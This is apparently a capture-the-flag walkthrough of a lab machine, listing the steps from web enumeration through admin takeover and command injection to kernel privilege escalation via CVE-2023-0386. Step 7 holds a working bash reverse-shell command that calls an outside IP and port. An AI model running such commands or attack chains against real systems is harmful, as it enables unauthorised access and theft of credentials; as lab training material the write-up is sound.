# Solve

1. feroxbuster discovered path to a minified javascript code at `/js/inviteapi.min.js` 
2. resolve the code with `beautifier.io/`
3. the code reveal the way to generate code which we need to register as a user
4. make a GET request to `/api/v1` to discover the available endpoints
5. use the `/api/v1/admin/settings/update` to change our account to admin
6. at username field at `/api/v1/admin/vpn/generate` is vulnerable to RCE.
7. `bash -c 'bash -i >& /dev/tcp/10.10.14.60/9001 0>&1'` to reverse shell
8. review source code and we realise the app is grabbing the database password from `.env`
9. `uname -a`, the kernel is vulnerable to `CVE-2023-0386`
10. copy the zipped file to the server and execute as the README instruction